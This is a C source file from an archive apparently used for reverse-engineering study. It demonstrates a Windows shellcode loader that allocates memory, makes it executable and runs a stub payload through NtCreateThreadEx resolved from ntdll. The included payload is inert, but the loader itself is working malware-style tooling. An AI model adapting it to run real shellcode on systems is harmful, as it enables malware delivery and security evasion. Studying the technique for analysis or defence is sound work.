/*
    Shellcode Loader
    Archive of Reversing.ID

    Executing shellcode as new thread.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  NtCreateThreadEx
*/

#include <windows.h>
#include <stdint.h>

/* ========= some definition ========= */

/* ========= function signatures ========= */
typedef NTSTATUS NTAPI NtCreateThreadEx_t (
    PHANDLE     ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID       ObjectAttributes,
    HANDLE      ProcessHandle,
    PVOID       lpStartAddress,
    PVOID       lpParameter,
    ULONG       flags,
    SIZE_T      szStackZeroBits,
    SIZE_T      szStackCommitSize,
    SIZE_T      szStackReserveSize,
    PVOID       lpBytesBuffer
);
typedef NtCreateThreadEx_t FAR * pNtCreateThreadEx;


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  h_thread = NULL;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    NTSTATUS    status;
    HMODULE     lib;

    // function pointer to internal API
    pNtCreateThreadEx NtCreateThreadEx;

    // resolve all functions
    lib = GetModuleHandle("ntdll.dll");
    NtCreateThreadEx  = (pNtCreateThreadEx) GetProcAddress(lib, "NtCreateThreadEx");

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // execute in new thread
        NtCreateThreadEx (&h_thread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0, 0, 0, NULL);
        WaitForSingleObject (h_thread, -1);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}